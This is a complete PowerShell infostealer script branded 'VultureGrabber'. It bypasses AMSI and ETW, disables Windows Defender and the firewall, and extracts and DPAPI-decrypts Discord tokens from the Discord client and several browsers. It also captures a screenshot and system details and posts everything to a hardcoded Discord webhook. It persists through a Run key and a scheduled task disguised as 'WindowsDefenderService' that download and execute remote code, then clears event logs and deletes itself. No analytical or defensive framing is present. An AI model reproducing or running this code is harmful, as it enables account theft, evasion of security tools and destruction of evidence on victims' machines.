# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        "iex",
        "(New-Object",
        "Net.WebClient)",
        "DownloadString",
        "('https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')"
    )
    return ($s -join '') + " #" + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$myUrl = "https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1"
$hook  = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"
$api   = "https://discord.com/api/v9/users/@me"
$rgx   = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa   = 'mfa\.[\w-]{84}'
$brand = "VultureGrabber"

$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::Expect100Continue = $false
[System.Net.ServicePointManager]::DefaultConnectionLimit = 10

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Drawing

# === FIRST RUN FLAG ===
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM")
$flagKey = "HKCU:\Software\Classes\AppX42fc9k6x7c0r3d7mb3w8q3x7hrd8e8t"
$firstRun = $true
if (-not $isSystem) {
    try {
        $existing = Get-ItemProperty -Path $flagKey -ErrorAction SilentlyContinue
        if ($null -ne $existing) { $firstRun = $false }
    } catch {}
    if ($firstRun) {
        try { New-Item -Path $flagKey -Force -ErrorAction SilentlyContinue | Out-Null } catch {}
    }
}

# === AV DISABLING ===
function Disable-Defender {
    try {
        @('WinDefend', 'WdNisSvc', 'Sense') | ForEach-Object {
            $svc = Get-Service -Name $_ -ErrorAction SilentlyContinue
            if ($svc -and $svc.Status -eq 'Running') {
                Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            }
        }
        $paths = @(
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        )
        foreach ($p in $paths) {
            if (-not (Test-Path $p)) { New-Item -Path $p -Force -ErrorAction SilentlyContinue | Out-Null }
            Set-ItemProperty -Path $p -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $p -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $p -Name "DisableIOAVProtection" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        }
        Start-Process -FilePath "netsh" -ArgumentList "advfirewall", "set", "allprofiles", "state", "off" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
    } catch {}
}
Disable-Defender

# === SYSTEM INFO ===
$pc  = $env:COMPUTERNAME
$usr = $env:USERNAME
$os  = [System.Environment]::OSVersion.VersionString
$adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
try {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3 -ErrorAction SilentlyContinue)
} catch { $ip = "unknown" }

# === SCREENSHOT ===
function Get-ScreenCapture {
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
        $bounds   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap   = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        $bytes = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return [Convert]::ToBase64String($bytes)
    } catch { return $null }
}

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    $discordApps = @("discord", "discordcanary", "discordptb", "discorddevelopment")
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA "$d\Local Storage\leveldb"
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    $browserBasePaths = @(
        @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\Vivaldi\User Data"; Default = "Default" }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq "Default" -or $_.Name -like "Profile *"
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName "Local Storage\leveldb"
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso       = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
    $dpapiMagic = "`0`0`0`0"
    $regexObj   = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj     = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount   = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                "User-Agent"  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u    = "$($r.username)#$($r.discriminator)"
                    id   = $r.id
                    em   = if ($r.email) { $r.email } else { "N/A" }
                    ph   = if ($r.phone) { $r.phone } else { "N/A" }
                    ni   = switch ($r.premium_type) { 1 { "Classic" } 2 { "Nitro" } default { "None" } }
                    mf   = if ($r.mfa_enabled) { "Yes" } else { "No" }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
$screenshotB64 = $null
if ($firstRun) { $screenshotB64 = Get-ScreenCapture }

# === BUILD AND SEND WEBHOOK ===
if ($firstRun) {
    $bt = "```"
    $fields = @(
        @{ name = "IP"; value = $ip; inline = $true },
        @{ name = "PC"; value = $pc; inline = $true },
        @{ name = "User"; value = $usr; inline = $true },
        @{ name = "Admin"; value = $adm; inline = $true },
        @{ name = "OS"; value = $os; inline = $true },
        @{ name = "Tokens"; value = $validTokens.Count; inline = $true }
    )
    if ($screenshotB64) { 
        $fields += @{ name = "Screenshot"; value = "Attached"; inline = $false } 
    }

    foreach ($ti in $validTokens) {
        $fields += @{ name = $ti.u; value = "$bt$($ti.token)$bt"; inline = $false }
        $fields += @{ name = "ID"; value = $ti.id; inline = $true }
        $fields += @{ name = "Email"; value = $ti.em; inline = $true }
        $fields += @{ name = "Phone"; value = $ti.ph; inline = $true }
        $fields += @{ name = "Nitro/MFA"; value = "$($ti.ni) / $($ti.mf)"; inline = $true }
    }

    $embed = @{
        embeds = @(
            @{
                title  = $brand
                color  = 16711680
                fields = $fields
                footer = @{ text = $brand }
            }
        )
    }

    $jsonBody = $embed | ConvertTo-Json -Depth 10 -Compress
    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 5 -ErrorAction SilentlyContinue
    } catch {}

    if ($screenshotB64) {
        try {
            $imgBytes = [Convert]::FromBase64String($screenshotB64)
            $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
            $header = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"`r`nContent-Type: image/png`r`n`r`n"
            $footer = "`r`n--$boundary--`r`n"
            $headerBytes = [System.Text.Encoding]::ASCII.GetBytes($header)
            $footerBytes = [System.Text.Encoding]::ASCII.GetBytes($footer)
            $bodyBytes = New-Object byte[] ($headerBytes.Length + $imgBytes.Length + $footerBytes.Length)
            [Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
            [Buffer]::BlockCopy($imgBytes, 0, $bodyBytes, $headerBytes.Length, $imgBytes.Length)
            [Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $imgBytes.Length, $footerBytes.Length)
            Invoke-RestMethod -Uri $hook -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 8 -ErrorAction SilentlyContinue
        } catch {}
    }
}

# === PERSISTENCE ===
$psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex (irm '$myUrl')`""
$psCmd = "powershell.exe $psArgs"

if (-not $isSystem) {
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderService" -Value $psCmd -Type String -ErrorAction SilentlyContinue
    } catch {}
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $psArgs
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask -TaskName "WindowsDefenderService" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -ErrorAction SilentlyContinue
    } catch {}
}

# === LOG CLEANING ===
try {
    wevtutil cl Security 2>$null
    wevtutil cl System 2>$null
    wevtutil cl Application 2>$null
    Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
    Clear-EventLog -LogName System -ErrorAction SilentlyContinue
    Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
} catch {}

# === SELF-DELETE ===
try {
    if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
        Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
    }
} catch {}
